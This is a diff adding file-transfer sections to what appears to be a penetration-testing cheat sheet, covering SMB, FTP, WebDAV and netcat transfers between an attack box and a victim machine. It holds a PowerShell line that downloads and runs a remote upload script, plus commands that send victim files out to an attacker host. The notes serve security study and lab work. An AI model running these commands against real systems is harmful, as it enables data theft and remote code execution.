@@ -1210,12 +1210,62 @@ curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
 # SMB 
   1. Setup SMB servAer on attack box using smbserver.py
     sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+  2. Mount the share using the creds
+    net use n: \\[ip]\share /user:test test
+
+
+# FTP (Using pyftpdlib)
+  1. Start python program and specify port you want to use 
+    sudo python3 -m pyftpdlib --port [port typically 21 or 20]
+
   2. From the victim machine 
-    copy \\[ip]\share\file
+    (New-Object Net.WebClient).DownloadFile('ftp://[ip]/file.txt', 'C:\Users\Public\file.txt')
+
+  3. If you dont have an interactive shell on victim machine you can create a file that contains ftp commands and pass that file to the ftp command to run
+    ftp -v -n -s:file.txt
 
 
+# Upload from Victim to Attack Machine 
+  1. Base64 Encode and decode on Attack Machine 
 
+  2. Python "uploadserver". Can upload files from vicitm machine to it. 
+    python3 -m uploadserver
+    # Download powershell upload ps1
+    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+    # Upload file to remote machine 
+    PS C:\htb> Invoke-FileUpload -Uri http://[ip]:[server port]/upload -File C:\Windows\System32\drivers\etc\hosts
+
+  3. netcat on attack machine and sent post request from victim 
+    nc -lvnp 8000
+    # Set var == Data you want to send 
+    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+    Invoke-WebRequest -Uri http://[ip]:8000/ -Method POST -Body $b64
   
+
+# SMB Uploads - Using WebDAV (RFC 4918)
+  SMB will first try to connect to a remote target using SMB, if that fails it will then try using HTTP. We can setup a WebDav server.
+
+  1. Install python wsgidav cheroot
+
+  2. Start wsdigav 
+    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+  3. Connect to share using DavWWWRoot 
+    dir \\192.168.49.128\DavWWWRoot
+
+  4. Upload from victim to attack 
+    copy C:\local\file \\[attack ip]\DavWWWRoot\
+
+
+# FTP upload 
+  1. Start pyftpdlib - Specify --write for upload 
+    sudo python3 -m pyftpdlib --port 21 --write
+
+  2. Upload from Victim 
+    (New-Object Net.WebClient).UploadFile('ftp://[ip]/ftp-hosts', 'C:\local\file\')
+
+  3. Use text file with ftp commands (As shown above) if no interactive temrinal
 ```
 
 
